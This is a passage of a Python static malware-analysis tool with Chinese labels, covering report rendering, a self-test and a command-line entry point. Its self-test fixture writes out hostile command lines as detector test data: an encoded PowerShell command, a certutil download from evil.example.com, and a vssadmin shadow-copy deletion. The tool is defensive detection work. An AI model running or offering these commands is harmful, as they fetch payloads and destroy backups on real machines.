        L.append("## PE 结构")
        L.append(f"- Machine：{pe.get('machine')}　Subsystem：{pe.get('subsystem')}")
        L.append(f"- 编译时间（UTC）：{pe.get('compile_time_utc') or '（空）'}")
        L.append(f"- 节区数：{pe.get('section_count')}　Overlay：{pe.get('overlay_bytes')} 字节")
        L.append(f"- ASLR/DEP/CFG：{pe.get('has_aslr')}/{pe.get('has_dep')}/{pe.get('has_cfg')}")
        L.append("")
        L.append("| 节区 | 虚拟大小 | 原始大小 | 熵 | 权限 |")
        L.append("|---|---|---|---|---|")
        for s in pe.get("sections") or []:
            perm = ("R" if s.get("readable") else "") + \
                   ("W" if s.get("writable") else "") + \
                   ("X" if s.get("executable") else "")
            L.append(f"| {s.get('name')} | {s.get('virtual_size')} | {s.get('raw_size')} "
                     f"| {s.get('entropy')} | {perm} |")
        L.append("")

    anom = d.get("anomalies") or []
    if anom:
        L.append("## 结构异常")
        L.extend(f"- [+{a['weight']}] {a['why']}" for a in anom)
        L.append("")

    apis = d.get("api_hits") or []
    if apis:
        L.append("## 可疑导入 API")
        L.extend(f"- [+{a['weight']}] `{a['api']}` — {a['why']}" for a in apis)
        L.append("")

    ind = d.get("indicators") or {}
    hits = ind.get("hits") or []
    if hits:
        L.append("## 可疑字符串命中")
        L.extend(f"- [+{x['weight']}] {x['why']}" for x in hits)
        L.append("")
    for key, title in (("urls", "URL"), ("ips", "公网 IP"), ("domains", "域名")):
        vals = ind.get(key) or []
        if vals:
            L.append(f"## 提取到的{title}（需人工核实，不是结论）")
            L.extend(f"- `{v}`" for v in vals[:40])
            L.append("")

    errs = d.get("errors") or []
    if errs:
        L.append("## 解析告警")
        L.extend(f"- {e}" for e in errs)
        L.append("")

    L.append("## 边界")
    L.append("本报告**只做静态分析，未执行样本**。静态分析看不到运行时行为"
             "（解密后的代码、实际外连、落地物），加壳样本尤其如此。"
             "要动态行为需要在沙箱内引爆（受三重开关约束）。")
    return "\n".join(L)


# --------------------------------------------------------------------------- #
# 自检
# --------------------------------------------------------------------------- #

def selftest() -> int:
    import tempfile

    _harden_console()
    ok = 0
    fail = 0

    def chk(name: str, cond: bool, detail: str = "") -> None:
        nonlocal ok, fail
        if cond:
            ok += 1
            print(f"  [OK]   {name}")
        else:
            fail += 1
            print(f"  [FAIL] {name}  {_safe(detail)}")

    print("=== sandbox.payload 自检 ===")

    # -- 熵 --
    chk("全零数据熵为 0", shannon_entropy(b"\x00" * 1024) == 0.0)
    chk("0..255 均匀分布熵接近 8",
        shannon_entropy(bytes(range(256))) > 7.99)
    chk("单字节重复熵为 0", shannon_entropy(b"A" * 999) == 0.0)

    with tempfile.TemporaryDirectory() as td:
        tdp = Path(td)

        # -- 非 PE 输入：必须优雅返回，不能抛 --
        txt = tdp / "note.txt"
        txt.write_text("hello world, this is not a PE", encoding="utf-8")
        rep = analyse(str(txt), with_signature=False)
        chk("非 PE 文件能出报告（不抛异常）", rep.pe is not None and rep.pe.get("is_pe") is False)
        chk("非 PE 有哈希", len((rep.hashes or {}).get("sha256", "")) == 64)
        chk("非 PE 判为低风险", rep.risk == "low", rep.risk)
        chk("非 PE 的 verdict 明确写「不等于安全」", "不等于安全" in rep.verdict)

        # -- 哈希正确性：与 hashlib 直接算的对比 --
        pat = tdp / "pat.bin"
        pat.write_bytes(b"abc")
        h = hashes(pat)
        chk("sha256 与 hashlib 一致",
            h["sha256"] == hashlib.sha256(b"abc").hexdigest(), h["sha256"])
        chk("md5 与 hashlib 一致", h["md5"] == hashlib.md5(b"abc").hexdigest())
        chk("size 统计正确", h["size"] == 3)

        # -- 畸形 PE：这些都必须不崩 --
        cases = {
            "MZ 但 PE 头越界": b"MZ" + b"\x00" * 0x3E + struct.pack("<I", 0x7FFFFFFF),
            "MZ + PE 签名但节区表溢出": (b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
                                        + b"PE\x00\x00" + struct.pack("<H", 0x8664)
                                        + struct.pack("<H", 0xFFFF) + b"\x00" * 100),
            "截断到 1 字节": b"M",
            "MZ 全零": b"MZ" + b"\x00" * 200,
        }
        for name, blob in cases.items():
            f = tdp / (name.replace(" ", "_") + ".bin")
            f.write_bytes(blob)
            try:
                r = analyse(str(f), with_signature=False, with_strings=False)
                chk(f"畸形输入不崩：{name}", True)
            except Exception as exc:  # noqa: BLE001
                chk(f"畸形输入不崩：{name}", False, f"{type(exc).__name__}: {exc}")

        # -- 真 PE：用系统自带的 notepad.exe 验证解析（不依赖任何第三方样本）--
        real = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "notepad.exe"
        if real.exists():
            pe = pe_info(str(real))
            chk("真 PE 解析成功", bool(pe and pe.get("is_pe")), str(pe)[:80])
            chk("真 PE 识别为 AMD64 或 I386", pe.get("machine") in ("AMD64", "I386"),
                str(pe.get("machine")))
            chk("真 PE 有节区与导入表",
                (pe.get("section_count") or 0) > 0 and len(pe.get("imports") or []) > 0,
                f"sections={pe.get('section_count')} imports={len(pe.get('imports') or [])}")
            chk("真 PE 编译时间戳非零", (pe.get("compile_timestamp") or 0) > 0)
            chk("真 PE 的节区熵在合理区间（0~8）",
                all(0 <= (s["entropy"] or 0) <= 8 for s in pe.get("sections") or []))
            rep2 = analyse(str(real), with_signature=False, with_strings=False)
            chk("真 PE 报告带 anomalies 列表", isinstance(rep2.anomalies, list))
            chk("系统目录里的 notepad 不是 high/critical",
                rep2.risk in ("low", "medium"), f"{rep2.risk}/{rep2.score}")
        else:
            print(f"  [跳过] 找不到 {real}")

        # -- 指标匹配 --
        fake = ("powershell.exe -EncodedCommand SQBFAFgA\n"
                "certutil.exe -urlcache -f http://evil.example.com/a.exe a.exe\n"
                "vssadmin.exe delete shadows /all /quiet\n"
                "http://10.0.0.5/internal\nhttp://203.0.113.77/payload.bin\n"
                "connect to 8.8.8.8 and 192.168.1.10\n")
        ind = find_indicators(fake.split("\n"))
        whys = " ".join(h["why"] for h in ind["hits"])
        chk("命中编码命令", "编码命令" in whys)
        chk("命中 certutil 下载", "certutil" in whys)
        chk("命中卷影删除", "卷影" in whys)
        chk("公网 IP 被提取", "203.0.113.77" in ind["ips"], str(ind["ips"]))
        chk("私有 IP 被排除（10.x / 192.168.x）",
            "10.0.0.5" not in ind["ips"] and "192.168.1.10" not in ind["ips"],
            str(ind["ips"]))
        chk("URL 被提取", any("evil.example.com" in u for u in ind["urls"]))
        chk("打分非零且封顶 100", 0 < ind["score"] <= 100, str(ind["score"]))

        # -- 字符串提取 --
        # 两种宽字符都要覆盖：ASCII 内容的宽字符形式（命令行/URL/注册表）与
        # **非 ASCII 的宽字符**（中文路径 —— 本机注册表里就有 `妹居物语.exe`）。
        s = tdp / "strings.bin"
        s.write_bytes(b"\x00" * 10 + b"THIS_IS_AN_ASCII_STRING" + b"\x00" * 4
                      + "powershell -enc SQBFAFgA".encode("utf-16-le") + b"\x00\x00"
                      + r"C:\Users\user\同步空间\载荷.exe".encode("utf-16-le") + b"\x00\x00")
        st = extract_strings(str(s))
        chk("ASCII 字符串被提取", any("THIS_IS_AN_ASCII" in x for x in st["strings"]))
        chk("宽字符里的 ASCII 内容被提取",
            any("powershell -enc" in x for x in st["strings"]), _safe(st["strings"])[:200])
        chk("宽字符里的非 ASCII 内容被提取（中文路径）",
            any("同步空间" in x for x in st["strings"]), _safe(st["strings"])[:200])
        chk("截断标志为 False（小文件）", st["truncated"] is False)

        # -- Markdown 渲染 --
        md = render_markdown(analyse(str(txt), with_signature=False))
        chk("Markdown 含哈希与边界说明",
            "SHA-256" in md and "只做静态分析" in md)

    print(f"\nsandbox.payload 自检：{ok} 通过 / {fail} 失败")
    return 1 if fail else 0


def main(argv: Optional[List[str]] = None) -> int:
    import argparse

    ap = argparse.ArgumentParser(description="载荷静态取证分析（不执行样本）")
    ap.add_argument("path", nargs="?", help="要分析的载荷路径")
    ap.add_argument("--out", default="", help="把 Markdown 报告写到该文件")
    ap.add_argument("--json", dest="json_out", default="",
                    help="把 JSON 报告写到该文件")
    ap.add_argument("--no-signature", action="store_true", help="跳过签名查询（更快）")
    ap.add_argument("--no-strings", action="store_true", help="跳过字符串提取（更快）")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    if not args.path:
        ap.print_help()
        return 2

    _harden_console()
    rep = analyse(args.path, with_signature=not args.no_signature,
                  with_strings=not args.no_strings)
    md = render_markdown(rep)
    if args.out:
        Path(args.out).write_text(md, encoding="utf-8")
        print(f"Markdown 报告已写入 {args.out}")
    else:
        print(md)
    if args.json_out:
        Path(args.json_out).write_text(rep.to_json(), encoding="utf-8")
        print(f"JSON 报告已写入 {args.json_out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
